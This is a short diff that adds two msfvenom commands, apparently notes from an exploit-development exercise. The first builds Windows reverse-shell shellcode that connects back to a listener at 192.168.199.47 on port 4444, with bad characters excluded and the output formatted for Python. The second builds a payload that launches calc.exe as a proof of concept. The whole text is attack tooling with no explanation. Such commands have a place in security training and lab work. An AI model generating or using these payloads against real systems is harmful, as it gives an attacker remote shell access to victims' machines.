@@ -1,0 +1,2 @@
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.199.47 LPORT=4444 -b "\x00\x0d" -f python
+msfvenom -p windows/exec cmd="calc.exe" LHOST=192.168.199.47 LPORT=4444 -b "\x00\x0d" -f python
